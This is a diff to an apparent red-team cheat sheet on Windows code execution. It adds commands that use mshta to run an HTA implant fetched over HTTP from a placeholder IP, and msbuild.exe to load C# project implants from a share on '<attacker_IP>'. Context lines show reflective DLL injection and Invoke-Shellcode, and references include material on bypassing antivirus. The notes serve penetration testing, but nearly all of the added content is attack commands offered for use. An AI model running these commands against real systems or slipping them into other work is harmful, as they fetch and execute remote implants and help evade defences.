@@ -1,6 +1,26 @@
 # Windows
 
-## 01 - Powershell Scripts
+## 01 - Code Execution
+
+### 1.1 - HTA
+
+```
+C:\> mshta <drive_letter>:\absolute\path\to\implant.hta
+
+C:\> mshta http[s]://<IP>/implant.hta
+```
+
+### 1.2 - MSBuild
+
+Execute C# project implants.
+
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.csproj
+
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attacker_IP>\implant.xml
+```
+
+## 02 - Powershell Scripts
 
 ### 1.1 - Reflective DLL Injection
 
@@ -81,7 +101,11 @@ Invoke-Shellcode -ProcessId $procid -Shellcode @(<ps1_shellcode_format>)
 ---
 ## References
 
+- [[DotNET Execution|Code Execution: MSBuild]]
+
 - [Invoke-ReflectivePEInjection](https://github.com/charnim/Invoke-ReflectivePEInjection.ps1)
+
+- [Red Team Notes: Code Execution](https://www.ired.team/offensive-security/code-execution)
 
 - [Adamn Chester (XPN) YouTube Video: Bypass AV with Invoke-ReflectivePEInjection](https://www.youtube.com/watch?v=byMBx4q-vYo)
 
